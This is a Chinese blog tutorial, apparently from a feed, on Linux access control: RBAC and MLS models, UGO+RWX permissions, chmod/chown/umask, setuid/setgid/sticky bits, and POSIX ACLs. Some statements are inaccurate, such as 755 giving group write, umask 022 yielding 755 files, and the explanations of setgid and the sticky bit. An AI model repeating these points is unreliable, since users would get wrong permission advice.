<li>最小权限原则之所以被RBAC所支持，是因为RBAC可以将其角色配置成其完成任务所需要的最小的权限集；</li>
<li>责任分离原则可以通过调用相互独立的角色来共同完成一个任务，比如要求一个计帐员和财务管理员一起参与过帐；</li>
<li>数据抽象可以通过权限的抽象来体现，如财务操作用借款、存款等抽象权限，而不用操作系统提供的典型的读、写、执行权限。然而这些原则必须通过RBAC各部件的详细配置才能得以体现。</li>
</ul>
<p>SELinux 部分实现了RBAC的机制，SELinux 上下文中的 <strong>Role</strong> 元素，即是基于 RBAC 设计的，下文详解。</p>
<h3 id="1-3-多级别安全机制"><a href="#1-3-多级别安全机制" class="headerlink" title="1.3 多级别安全机制"></a>1.3 多级别安全机制</h3><hr>
<p><strong>MLS</strong>(Multi-Level Security，多级别安全)机制给用户提供了可以用不同等级的安全角色来访问系统。例如，MLS安全分级从低到高为<strong>Confidential</strong>、<strong>Secret</strong>、<strong>TOP Secret</strong> 和 <strong>Individuals</strong>，不同级别可以访问不同分类的信息，低级别无权访问高级别信息。</p>
<p>SELinux 中，客体上的安全级别称为 <strong>分级</strong>(Classifications)，主体上的安全级别称为 <strong>Clearances</strong>。SELinux上下文元素中的 <strong>安全级别</strong>，即是基于此安全机制而设计。SELinux 中的对象上下文，必须至少有一个安全级别(它由单个敏感度和0个或多个范围组成)，但可以包括两个安全级别，这两个安全级别分别叫做 <strong>低</strong>(或<strong>进程趋势</strong>，即安全级别下限) 或 <strong>高</strong>(或<strong>进程间隙</strong>，即安全级别上限)，如果<strong>高</strong>安全级别丢失，它会被认为与低安全级别的值相同(最常见的情况)。实际上，对于客体和进程而言，低和高安全级别通常都是相同的，通常用于进程的级别范围被认为是受信任的主体（即进程信任降级信息）或多层客体，如一个目录，它又包括了不同安全级别的客体。</p>
<h2 id="2-自主访问控制"><a href="#2-自主访问控制" class="headerlink" title="2. 自主访问控制"></a>2. 自主访问控制</h2><p>Linux中实现的<strong>自主访问控制</strong>(DAC)机制主要包括基础的 <code>UGO+RWX</code> 和加强的 <code>ACL(Access Control List)</code>。</p>
<h3 id="2-1-UGO-RWX-相关"><a href="#2-1-UGO-RWX-相关" class="headerlink" title="2.1 UGO+RWX 相关"></a>2.1 UGO+RWX 相关</h3><hr>
<p>该机制的思想是通过对用户(组)及其所属进程对文件和目录的访问赋予一定的权限，来实现基本的权限管理与访问控制。</p>
<p>Linux为每个文件都分配了一个文件所有者，称为文件主，并赋予文件主惟一的注册名。对文件的控制取决于文件主或超级用户（root）。文件或目录的创建者对创建的文件或目录拥有特别使用权。</p>
<p>文件的所有关系是可以改变的，可以将文件或目录的所有权转让给其它用户，但只有文件主或root用户才有权改变文件的所有关系。文件的所有权的标志是用户ID(UID)，这正是DAC机制的核心概念。</p>
<h4 id="2-1-1-UGO-RWX表示"><a href="#2-1-1-UGO-RWX表示" class="headerlink" title="2.1.1 UGO+RWX表示"></a>2.1.1 UGO+RWX表示</h4><p>Linux系统中的每个文件和目录（客体）都有相应的访问权限，通过其确定谁（主体）可以通过何种方式对文件/目录进行访问和操作。文件/目录（客体）的访问权限分为三种：<strong>读</strong>、<strong>写</strong> 和 <strong>执行</strong>。该机制限制三种不同的<strong>主体</strong>：<strong>文件所有者</strong>、<strong>同组用户</strong> 和 <strong>其他用户</strong>。</p>
<p>每个文件或目录的访问权限都有三组，每组用三位表示，分别为文件属主的读、写和执行三种权限。当用Shell命令 <code>ls -l</code> 显示文件或目录的详细信息时，最左边的一排为文件的访问权限。例如：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">➜  ls <span class="_">-l</span> /var</div><div class="line"></div><div class="line">drwxr-xr-x.  2 root root   18 10月 16 17:25 account</div><div class="line">drwxr-xr-x.  2 root root    6 6月  10 2014 adm</div><div class="line">drwxr-xr-x. 11 root root 4096 12月 12 14:32 cache</div><div class="line">drwxr-xr-x.  2 root root    6 10月 23 19:27 crash</div><div class="line">drwxr-xr-x.  3 root root   32 12月 10 14:54 db</div><div class="line">drwxr-xr-x.  3 root root   17 10月 16 17:25 empty</div><div class="line">drwxr-xr-x.  2 root root    6 6月  10 2014 games</div><div class="line">drwxr-xr-x.  2 root root    6 6月  10 2014 gopher</div><div class="line">-rw-r--r--.  1 root root   25 12月 12 15:01 info.php</div><div class="line">drwxr-xr-x.  3 root root   17 10月 16 17:21 kerberos</div><div class="line">drwxr-xr-x. 40 root root 4096 12月 17 03:20 lib</div><div class="line">drwxr-xr-x.  2 root root    6 6月  10 2014 <span class="built_in">local</span></div><div class="line">lrwxrwxrwx.  1 root root   11 10月 16 17:19 lock -&gt; ../run/lock</div><div class="line">drwxr-xr-x. 13 root root 4096 12月 15 14:50 <span class="built_in">log</span></div><div class="line">lrwxrwxrwx.  1 root root   10 10月 16 17:19 mail -&gt; spool/mail</div><div class="line">drwxr-xr-x.  2 root root    6 6月  10 2014 nis</div><div class="line">drwxr-xr-x.  2 root root    6 6月  10 2014 opt</div><div class="line">drwxr-xr-x.  2 root root    6 6月  10 2014 preserve</div><div class="line">lrwxrwxrwx.  1 root root    6 10月 16 17:19 run -&gt; ../run</div><div class="line">drwxr-xr-x. 10 root root 4096 10月 16 17:25 spool</div><div class="line">drwxrwxrwt.  7 root root 4096 12月 15 14:52 tmp</div><div class="line">drwxr-xr-x.  3 root root   16 10月 16 17:23 var</div><div class="line">drwxr-xr-x.  4 root root   31 12月 12 15:03 www</div><div class="line">drwxr-xr-x.  2 root root    6 6月  10 2014 yp</div></pre></td></tr></table></figure>
<p>权限列共有 10 个字符，第一个字符为文件类型，后面九个分为三组：第一组为 <strong>U</strong>(User) ，即文件属主对应的权限；第二组为 <strong>G</strong>(Group)，即同组用户对应的权限；第三组为 <strong>O</strong>(Others)，即其他用户对应的权限。每个字符的意义可用下图描述：</p>
<p><img src="/imgs/1418802142487.png" alt="图解文件权限"></p>
<blockquote>
<p><strong>NOTE</strong>:<br>上面例子中，权限列的第一个字符（文件类型），<code>-</code>代表普通文件；<code>l</code>代表链接文件；<code>d</code>代表目录文件。</p>
</blockquote>
<p>另，Linux中，文件与目录的权限有所区别，如下所示：</p>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">文件</th>
<th style="text-align:center">目录</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>R</strong>(可读)</td>
<td style="text-align:center">读取文件内容</td>
<td style="text-align:center">读包含在目录中的文件名称</td>
</tr>
<tr>
<td style="text-align:center"><strong>W</strong>(可写)</td>
<td style="text-align:center">对文件内容进行编辑</td>
<td style="text-align:center">可以写信息到目录中，即可以创建、删除文件、移动文件等操作</td>
</tr>
<tr>
<td style="text-align:center"><strong>X</strong>(可执行)</td>
<td style="text-align:center">作为执行文件执行</td>
<td style="text-align:center">可以进入目录；可以搜索（能用该目录名称作为路径名去访问它所包含的文件和子目录）</td>
</tr>
</tbody>
</table>
<p><strong>举例说明</strong>：</p>
<ol>
<li>对文件有 <code>w</code> 权限不能删除文件，需要对文件所在的目录有 <code>w</code> 权限；</li>
<li>对目录有 <code>w</code> 权限不能 <code>cd</code> 进入目录，需要对目录有 <code>x</code> 权限；</li>
<li>对目录有 <code>x</code> 权限，只有在知道文件名并且有 <code>r</code> 权限的时候才能访问目录下的文件；</li>
<li>对目录必须有 <code>x</code> 权限才能 <code>cd</code> 进入到目录，必须有 <code>rx</code> 权限才能使用 <code>ls</code> 列出目录清单</li>
<li>对目录有 <code>w</code> 权限，可以对目录中的任何文件或子目录进行创建、删除或修改操作，即使该文件或目录的所有者是其它用户也是如此。</li>
</ol>
<h4 id="2-1-2-权限管理"><a href="#2-1-2-权限管理" class="headerlink" title="2.1.2 权限管理"></a>2.1.2 权限管理</h4><p><strong>chmod</strong></p>
<p><code>chmod</code>命令可以修改文件或目录的权限，但有两种方式来修改，一种是字母权限设定法，另一种是数字权限设定法。用字母权限设定法时，该命令的格式通常是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod [who] [+|-|=] [mode] [file/dir]</div></pre></td></tr></table></figure></p>
<p>其中，操作对象 <code>who</code> 表示将权限赋予的<strong>主体</strong>；<code>[+|-|=]</code>部分是权限的操作符；<code>[mode]</code>即为三个标志位表示的权限。</p>
<p><code>who</code>可以是下列字母中的单个字母或多个字母的组合：</p>
<blockquote>
<p><code>u</code>: 表示 <strong>用户(User)</strong>，即文件属主；<br><code>g</code>: 表示 <strong>同组用户(Group)</strong>，即与文件属主在同一用户组的用户；<br><code>o</code>: 表示 <strong>其他用户(Others)</strong>；<br><code>a</code>: 表示 <strong>所有用户(All)</strong>。此为系统默认值</p>
</blockquote>
<p>权限操作符解释如下：</p>
<blockquote>
<p><code>+</code> : 添加某权限；<br><code>-</code>：取消某权限；<br><code>=</code> : 覆盖原权限。</p>
</blockquote>
<p><code>mode</code> 所表示的权限可用下列字母的任意组合：</p>
<blockquote>
<p><code>r</code>: 可读；<br><code>w</code>: 可写；<br><code>x</code>: 可执行(只有目标文件对某些用户是可执行的或该文件为目录时才可追加<code>X</code>属性)；<br><code>s</code>: 在文件执行时，把进程的属主或组ID置为该文件的文件属主。方式 <code>u+s</code> 设置文件的用户ID位，<code>g+s</code>设置组ID位；<br><code>t</code>: 将程序的文本保存到交换设备上；<br><code>u</code>: 与文件属主拥有同样的权限；<br><code>g</code>: 与文件属主同组用户拥有同样的权限；<br><code>o</code>: 与其他用户拥有同样的权限。</p>
</blockquote>
<hr>
<p><strong>数字权限设定法</strong></p>
<p><code>chmod</code>命令用这种方式设定文件/目录权限是的格式通常为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod [digital_mode] [file/dir]</div></pre></td></tr></table></figure></p>
<p>这种方法与字幕权限设定法在功能上是等价的，不过更加简便：将上述字母表示的权限位映射为数字，并将3组数字组合起来。映射关系为：</p>
<blockquote>
<p><code>r</code> —-&gt; <code>4</code><br><code>w</code> —-&gt; <code>2</code><br><code>x</code> —-&gt; <code>1</code><br><code>-</code> —-&gt; <code>0</code> (空权限，即无此权限)</p>
</blockquote>
<p>所以数字属性的格式为 3 个 <code>0~7</code> 的八进制数，其顺序是 <strong>U/G/O</strong>。</p>
<p>对于两种权限表示方法，统一给出一组示例如下：</p>
<blockquote>
<p><code>-rw-------</code>  (600)    只有所有者才有读和写的权限<br><code>-rw-r--r--</code>  (644)     只有所有者才有读和写的权限，组群和其他人只有读的权限<br><code>-rwx------</code>  (700)     只有所有者才有读，写，执行的权限<br><code>-rwxr-xr-x</code>  (755)     只有所有者才有读，写，执行的权限，组群和其他人只有读和执行的权限<br><code>-rwx--x--x</code>  (711)     只有所有者才有读，写，执行的权限，组群和其他人只有执行的权限<br><code>-rw-rw-rw-</code>  (666)     每个人都有读写的权限<br><code>-rwxrwxrwx</code>  (777)     每个人都有读写和执行的权限</p>
<p><strong>NOTE</strong>:<br>使用 <code>chmod</code> 命令还可以将某个目录下的所有文件、子目录及子目录下的所有文件递归地设置为统一的权限，只需要加一个<code>-R</code>参数即可。</p>
</blockquote>
<hr>
<p><strong>chown</strong></p>
<p>该命令可以改变文件的<strong>属主</strong>。示例如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">➜ touch test.txt</div><div class="line">➜ ls <span class="_">-l</span></div><div class="line">-rw-r--r--. 1 root root 0 12月 17 17:20 test.txt</div><div class="line">➜ chown jiayu test.txt</div><div class="line">➜ ls <span class="_">-l</span></div><div class="line">-rw-r--r--. 1 jiayu root 0 12月 17 17:20 test.txt</div></pre></td></tr></table></figure></p>
<p>其实也可以修改文件所属的<strong>用户组</strong>，示例如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">➜ ls <span class="_">-l</span></div><div class="line">-rw-r--r--. 1 jiayu jiayu 0 12月 17 17:20 test.txt</div><div class="line">➜ chown :root test.txt </div><div class="line">➜ ls <span class="_">-l</span></div><div class="line">-rw-r--r--. 1 jiayu root 0 12月 17 17:20 test.txt</div></pre></td></tr></table></figure></p>
<p>还可以同时修改文件的<strong>属主</strong>和所属<strong>用户组</strong>：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">➜ ls <span class="_">-l</span></div><div class="line">-rw-r--r--. 1 jiayu jiayu 0 12月 17 17:20 test.txt</div><div class="line">➜ chown root:root test.txt </div><div class="line">➜ ls <span class="_">-l</span></div><div class="line">-rw-r--r--. 1 root root 0 12月 17 17:20 test.txt</div></pre></td></tr></table></figure></p>
<blockquote>
<p>该命令也可以用<code>-R</code>参数进行递归操作。</p>
</blockquote>
<hr>
<p><strong>chgrp</strong></p>
<p>该命令<strong>只可以</strong>修改文件所属的<strong>用户组</strong>：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">➜ ls <span class="_">-l</span></div><div class="line">-rw-r--r--. 1 root root 0 12月 17 17:20 test.txt</div><div class="line">➜ chgrp jiayu test.txt </div><div class="line">➜ ls <span class="_">-l</span></div><div class="line">-rw-r--r--. 1 root jiayu 0 12月 17 17:20 test.txt</div></pre></td></tr></table></figure></p>
<blockquote>
<p>该命令也可以用<code>-R</code>参数进行递归操作。</p>
</blockquote>
<hr>
<p><strong>umask</strong></p>
<p><code>umask</code>又叫<strong>权限掩码</strong>，其功能是<strong>设定新建文件/目录的默认权限</strong>。它与 <code>chmod</code> 配套，总共为4位（gid/uid,属主，组权，其它用户的权限）,不过通常用到的是后3个，例如你用 <code>chmod 755 file</code>（此时这文件的权限是属主读(4)+写(2)＋执行(1),同组的和其它用户有读写权限)。当新文件被创建时，<strong>其最初的权限由文件创建掩码决定</strong>。用户每次注册进入系统时，<code>umask</code>命令都被执行,并自动设置掩码 <code>mode</code> 来限制新文件的权限。用户可以通过再次执行<code>umask</code>来改变默认值，新的权限将会把旧的覆盖掉。</p>
<p>默认情况下的 <code>umask</code>值是 <code>022</code>(可以用<code>umask</code>命令查看），此时你建立的文件默认权限是755(即<code>777-022</code>)。</p>
<p>利用<code>umask</code>命令可以指定哪些权限将在新文件的默认权限中被删除。例如，可以使用下面的命令创建掩码,取消组用户的写权限以及其他用户的读、写和执行权限: <code>umask u=,g=w,o=rwx</code></p>
<p>执行该命令以后，下面所建新文件的文件主权限未作任何改变，而组用户没有写权限,其它用户的所有权限都被取消。</p>
<blockquote>
<p>在<code>umask</code>命令和<code>chmod</code>命令中，操作符<code>=</code>的作用恰恰相反。在<code>chmod</code>中,利用它来设置指定的权限,而其余权限都被取消；但是在<code>umask</code>命令中,它将在原有权限的基础上把指定的权限<strong>删除</strong>。</p>
</blockquote>
<p>不能直接利用<code>umask</code>创建一个可执行的文件,用户只能在其后利用<code>chmod</code>命令使它具有执行权限。假设执行了下面命令:<br><code>umask u=,g=w,o=rwx</code><br>虽然在命令行中，文件主和组用户的执行权限没有被删去，但默认的文件权限还 是640(即rw-r—–),而不是750(rwxr-x—)。但是，如果创建的是目录，或者通过编译程序创建一个可执行文件，将不受此限制。 在这种情况下,文件的执行权限会被设置。</p>
<p>此外，也可以使用八进制数值来设置mode。在umask中所指定的权限 表示要删除的权限，所以，如果一个文件原来的初始权限是777，那么执行命令<code>umask 022</code>以后, 那么该文件的权限将变为`755;<strong>如果该文件原来的初始权限是666, 那么该文件的权限将变为644</strong>。</p>
<hr>
<p><strong>特殊访问模式及粘滞位：setuid/setgid/sticky bit</strong></p>
<p>Linux中，非<code>root</code>用户可以使用<code>passwd</code>命令修改自己的密码，这是合理的设置，但是有个小问题：该命令位置是<code>/bin/passwd</code>，其详细的权限为：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ ls <span class="_">-l</span> /bin/passwd</div><div class="line">-rwsr-xr-x. 1 root root 27832 6月  10 2014 /bin/passwd</div></pre></td></tr></table></figure></p>
<p>可以看到其属主为<code>root</code>用户，所属用户组也为<code>root</code>组，那为何非<code>root</code>用户也可以调用此命令呢？<br>问题出在 <strong>本用户权限</strong> 处的<code>s</code>权限位，可以看到它处在原属于<strong>可执行权限<code>x</code></strong>的位置。这个<code>s</code>就是<code>setuid</code>位的标识。<code>setuid</code>位表明该文件在<strong><code>执行阶段</code></strong>具有文件属主的权限。所以非<code>root</code>用户也能调用这个本属于<code>root</code>用户的<code>/bin/passwd</code>命令来执行修改密码的操作。</p>
<p>与其类似的还有下面两个标志位：</p>
<ul>
<li><strong>setgid</strong>:该权限只对目录有效. 目录被设置该位后, 任何用户在此目录下创建的文件都具有和该目录所属的组相同的组;</li>
<li><strong>sticky bit</strong>: 粘滞位，该位可以理解为防删除位. 一个文件是否可以被某用户删除, 主要取决于该文件所属的组是否对该用户具有写权限. 如果没有写权限, 则这个目录下的所有文件都不能被删除, 同时也不能添加新的文件. 如果希望用户能够添加文件但同时不能删除文件, 则可以对文件使用<code>sticky bit</code>位. 设置该位后, 就算用户对目录具有写权限, 也不能删除该文件.</li>
</ul>
<p>这三个特殊权限位也可以用<code>chmod</code>命令来操作，同样也分字幕权限设定和数字权限设定两种方式。<br>文字设定法：</p>
<blockquote>
<p><code>chmod u+s file</code>：为文件 file 加上 setuid 标志位；<br><code>chmod g+s dir</code>：为目录 dir 加上 setgid 标志位；<br><code>chmod o+t file</code>：为文件 file 加上 sticky 标志。</p>
</blockquote>
<p>数字权限设定法：<br>其实本身linux 下权限是有四个数字的，我们常用的 <code>chmod 777 xxx</code> 其实默认是 <code>chmod 0777 xxx</code></p>
<p>而第一位的 <code>0</code> 也有 <code>4/2/1</code> 三种组合，分别代表</p>
<blockquote>
<p><code>setuid</code> 的二进制串为：<code>100</code>，换算十进制为：<code>4</code>，若该位有效，显示为<code>s</code>，在原来<strong>本用户权限</strong>的<code>x</code>标志位上；<br><code>setgid</code> 的二进制串为:<code>010</code>,换算十进制：<code>2</code>，若该位有效，显示为<code>s</code>，在原来<strong>同组用户权限</strong>的<code>x</code>标志位上；<br><code>sticky bit</code> 二进制串：<code>001</code>，换算十进制：<code>1</code>，若该位有效，显示为<code>t</code>,在原来<strong>其他用户权限</strong>的<code>x</code>标志位上。</p>
</blockquote>
<p>显示的示例如下：</p>
<blockquote>
<p><strong>r-srw-r–</strong> : 表示有 <code>setuid</code> 标志；<br><strong>rwxrwsrw-</strong> : 表示有 <code>setgid</code> 标志；<br><strong>rwxrw-rwt</strong> : 表示有 <code>sticky</code> 标志。</p>
</blockquote>
<h3 id="2-2-ACL相关"><a href="#2-2-ACL相关" class="headerlink" title="2.2 ACL相关"></a>2.2 ACL相关</h3><h4 id="2-2-1-为什么要用-ACL"><a href="#2-2-1-为什么要用-ACL" class="headerlink" title="2.2.1 为什么要用 ACL"></a>2.2.1 为什么要用 ACL</h4><hr>
<p>在Linux下,对一个文件(或者资源)可以进行操作的对象被分为三类: <strong>U</strong>(文件的拥有者), <strong>G</strong>(文件所属用户组), <strong>O</strong>(其他)；而对于每一类别又分别定义了<strong>R</strong>(可读)，<strong>W</strong>(可写)和 <strong>X</strong>(可执行)三种权限 (这里不讨论<code>SUID</code>, <code>SGID</code>以及<code>Sticky bit</code>的设置)。此即上述<code>UGO+RWX</code>的传统权限管理与访问控制机制。<br>通过<code>ls -l</code>命令就我们就可以列出一个文件的权限：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ ls <span class="_">-l</span> </div><div class="line">-rw-rw---- 1 leonard admin 0 Jul 3 20:12 test.txt</div></pre></td></tr></table></figure></p>
<p>在这里说明了对于<code>test.txt</code>这个文件<code>leonard</code>用户(由于是<code>file owner</code>)拥有权限. 所有属于<code>admin</code>组的用户(group)拥有读和写权限. 其他任何用户(other)对于文件没有任何的权限。<br>如果我们现在希望<code>john</code>这个用户也可以对<code>test.txt</code>文件进行读写操作.大概会想到以下几种办法 (<strong>这里假设<code>john</code>不属于<code>admin</code>用户组</strong>)：</p>
<ol>
<li>给文件的<strong>other</strong>类别增加读和写权限. 这样由于<code>john</code>会被归为<code>other</code>类别,那么他也将拥有读写的权限；</li>
<li>将<code>john</code>加入到<code>admin</code> 用户组. 那么<code>john</code>会被归为<code>admin</code>类别,那么他将拥有读写的权限；</li>
<li>设置<code>sudo</code>, 使<code>john</code>能够以<code>leonard</code>的身份对<code>test.txt</code>进行操作,从而获得读写权限。</li>
</ol>
<p>第一种做法的问题在于所有用户都将对<code>test.txt</code>拥有读写操作,显然这种做法不可取;<br>第二种做法的问题在于<code>john</code>被赋予了过多的权限.所有属于<code>admin</code>组的文件,<code>john</code>都可以拥有其等同的权限了;<br>第三种做法虽然可以达到只限定<code>john</code>用户一人拥有对<code>test.txt</code>文件的读写权限.但是需要对<code>sudoers</code>文件进行严格的格式控制. 而且当文件数量和用户很多的时候,这种方法就相当地不灵活了。</p>
<p>上述方案都不太理想，其实问题就出在 Linux 的 <strong>UGO+RWX</strong> 权限管理机制里面,对于<code>other</code>的定义过于广泛,以至于很难把权限限定于一个不属于<code>file owner</code>和<code>group</code>的用户身上。<strong>ACL(Access Control List，访问控制列表)</strong> 就是用来帮助我们解决这个问题的。</p>
<p>简单地来说ACL就是可以设置特定用户或者用户组对于一个文件的操作权限. 需要掌握的命令也只有三个: <code>getfacl</code>, <code>setfacl</code>, <code>chacl</code>。</p>
<h4 id="2-2-2-ACL安装"><a href="#2-2-2-ACL安装" class="headerlink" title="2.2.2 ACL安装"></a>2.2.2 ACL安装</h4><ol>
<li><p>Debian &amp; Ubuntu 下安装ACL：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">➜ apt-get install acl</div></pre></td></tr></table></figure>
</li>
<li><p>RHEL &amp; CentOS &amp; Fedora 下安装ACL ：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">➜ yum install acl</div></pre></td></tr></table></figure>
</li>
</ol>
<p>重新挂载分区(如果分区不支持ACL，需要以ACL的属性重新挂载)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">➜ mount -o remount,rw,acl /dev/sda3</div></pre></td></tr></table></figure>
<p><strong>分区在不支持acl的情况下<code>getfacl</code>可以工作，但是<code>setfacl</code>不能够工作的。</strong></p>
<h4 id="2-2-3-ACL机制简介"><a href="#2-2-3-ACL机制简介" class="headerlink" title="2.2.3 ACL机制简介"></a>2.2.3 ACL机制简介</h4><p>ACL 是由一系列的 <strong>Access Entry</strong> 所组成的. 每一条 <strong>Access Entry</strong> 定义了特定的类别可以对文件拥有的操作权限.，<strong>Access Entry</strong> 有三个组成部分: <code>Entry tag type</code>, <code>qualifier (optional)</code>, <code>permission</code>。</p>
<p>最重要的Entry tag type, 它有以下几个类型：</p>
<ul>
<li><strong>ACL_USER_OBJ</strong> : 相当于Linux里权限位<code>U</code>；</li>
<li><strong>ACL_USER</strong> : 定义了额外的用户可以对此文件拥有的权限；</li>
<li><strong>ACL_GROUP_OBJ</strong> : 相当于Linux里权限位<code>G</code>；</li>
<li><strong>ACL_GROUP</strong> : 定义了额外的组可以对此文件拥有的权限；</li>
<li><strong>ACL_MASK</strong> : 定义了<code>ACL_USER</code>, <code>ACL_GROUP_OBJ</code>和<code>ACL_GROUP</code>的最大权限；</li>
<li><strong>ACL_OTHER</strong> : 相当于Linux里权限位<code>O</code>。</li>
</ul>
<p>举例说明一下，<code>getfacl</code>命令来查看一个定义好了的ACL文件代码：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜ getfacl ./test.txt </div><div class="line"><span class="comment"># file: test.txt </span></div><div class="line"><span class="comment"># owner: leonard </span></div><div class="line"><span class="comment"># group: admin </span></div><div class="line">user::rw- </div><div class="line">user:john:rw- </div><div class="line">group::rw- </div><div class="line">group:dev:r-- </div><div class="line">mask::rw- </div><div class="line">other::r--</div></pre></td></tr></table></figure></p>
<p>前面三个以<code>#</code>开头的定义了文件名,<code>file</code>,<code>owner</code>和 <code>group</code>， 这些只是辅助信息，没有太大的作用,可以用 <code>--omit-header</code>参数来省略掉：</p>
<blockquote>
<p><strong>user::rw-</strong> : 定义了<code>ACL_USER_OBJ</code>, 说明<code>file owner</code>拥有读写权限；<br><strong>user:john:rw-</strong> : 定义了<code>ACL_USER</code>,这样用户<code>john</code>就拥有了对文件的读写权限,实现了我们一开始要达到的目的；<br><strong>group::rw-</strong> : 定义了<code>ACL_GROUP_OBJ</code>,说明文件的<code>group</code>拥有读写权限；<br><strong>group:dev:r–</strong> : 定义了<code>ACL_GROUP</code>,使得<code>dev</code>组拥有了对文件的读权限；<br><strong>mask::rw-</strong> : 定义了<code>ACL_MASK</code>的权限为读和写；<br><strong>other::r–</strong> : 定义了<code>ACL_OTHER</code>的权限为读。</p>
</blockquote>
<p>从这里可以看出ACL提供了定义特定用户和用户组相应权限的功能。关于如何设定一个文件或目录的ACL权限，以及 <code>ACL_MASK</code>怎么使用，<code>Default ACL</code>如何使用等信息，可参考参《<a href="http://linuxguest.blog.51cto.com/195664/124107" target="_blank" rel="external">Linux ACL管理详解</a>》。</p>
<h2 id="3-参考资料"><a href="#3-参考资料" class="headerlink" title="3. 参考资料"></a>3. 参考资料</h2><ol>
<li><a href="http://lichunhui.iteye.com/blog/1835802" target="_blank" rel="external">Linux文件或目录的读/写/执行权限</a></li>
<li><a href="http://www.lampweb.org/linux/2/6.html" target="_blank" rel="external">chmod 设置目录或文件的访问权限</a></li>
<li><a href="http://nba20717zcx.blog.51cto.com/343890/392063" target="_blank" rel="external">深入理解SetUID</a></li>
<li><a href="http://hubingforever.blog.163.com/blog/static/17104057920138232126687/" target="_blank" rel="external">chmod命令高级篇–SetUID与SetGID标识位</a></li>
<li><a href="http://linuxguest.blog.51cto.com/195664/124107" target="_blank" rel="external">Linux ACL管理详解</a></li>
<li><a href="http://wiki.debian.org.hk/w/Control_access_to_file_with_POSIX_ACL_in_Linux" target="_blank" rel="external">在 Linux 使用 POSIX ACL 控制档案的存取</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Linux系统的权限管理与访问控制，大体可以分为基础与高级两部分，基础机制即传统的UGO+RWX/ACL，高级的即为SELinux，本文将按照从基础到高级的顺序讲解，先从系统的安全模型说起。&lt;br&gt;另，&lt;strong&gt;本文中所有例子均是在 &lt;code&gt;CentOS7&lt;/code&gt; 中运行的，不同系统运行结果可能有所不同。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-安全模型概述&quot;&gt;&lt;a href=&quot;#1-安全模型概述&quot; class=&quot;headerlink&quot; title=&quot;1. 安全模型概述&quot;&gt;&lt;/a&gt;1. 安全模型概述&lt;/h2&gt;&lt;p&gt;操作系统的权限管理与访问控制机制，遵从一定的 &lt;strong&gt;安全模型&lt;/strong&gt; 或者 &lt;strong&gt;安全机制&lt;/strong&gt; ，常见的安全模型有 &lt;strong&gt;BLP安全模型&lt;/strong&gt;， &lt;strong&gt;RBAC安全模型&lt;/strong&gt; 和 &lt;strong&gt;多级别安全机制&lt;/strong&gt; 。Linux 系统也不例外，其基础的权限管理与访问控制机制和加强的 ACL 机制、SELinux，都对这些安全模型与安全机制有所实现。&lt;/p&gt;
&lt;h3 id=&quot;1-1-BLP安全模型&quot;&gt;&lt;a href=&quot;#1-1-BLP安全模型&quot; class=&quot;headerlink&quot; title=&quot;1.1 BLP安全模型&quot;&gt;&lt;/a&gt;1.1 BLP安全模型&lt;/h3&gt;&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;BLP&lt;/strong&gt;(Bell &amp;amp; Lapadula)安全模型是由David Bell 和 Leonard La Padula 在1973年模拟军事安全策略创建的计算机系统安全模型, 74年改进, 76年首次实现于 &lt;strong&gt;Multics&lt;/strong&gt; 操作系统。该安全模型是一个状态机模型，有一系列错综复杂的数学证明来保证其安全性的结果；它是定义多级安全性的基础，被视作&lt;strong&gt;基本安全公理&lt;/strong&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="system" scheme="http://jiayu0x.com/categories/system/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="linux" scheme="http://jiayu0x.com/tags/linux/"/>
    
      <category term="ACL" scheme="http://jiayu0x.com/tags/ACL/"/>
    
  </entry>
  
  <entry>
    <title>iptables 要点总结</title>
    <link href="http://jiayu0x.com/2014/12/02/iptables-essential-summary/"/>
    <id>http://jiayu0x.com/2014/12/02/iptables-essential-summary/</id>
